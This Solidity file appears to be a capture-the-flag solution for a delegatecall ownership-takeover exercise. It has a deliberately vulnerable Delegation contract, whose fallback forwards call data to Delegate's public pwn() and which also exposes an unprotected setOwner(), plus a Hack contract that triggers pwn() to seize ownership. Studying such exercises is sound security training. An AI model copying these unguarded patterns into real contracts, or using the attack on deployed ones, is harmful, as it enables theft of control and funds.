// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function setOwner(address a) public {
    owner = a;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

interface IDelegation {
    function pwn() external ;
}

contract Hack{
  address public iDelegation;

  constructor(address a){
    iDelegation = a;
  }

  function hack() public {
    iDelegation.call(abi.encodeWithSignature("pwn()"));
  }
}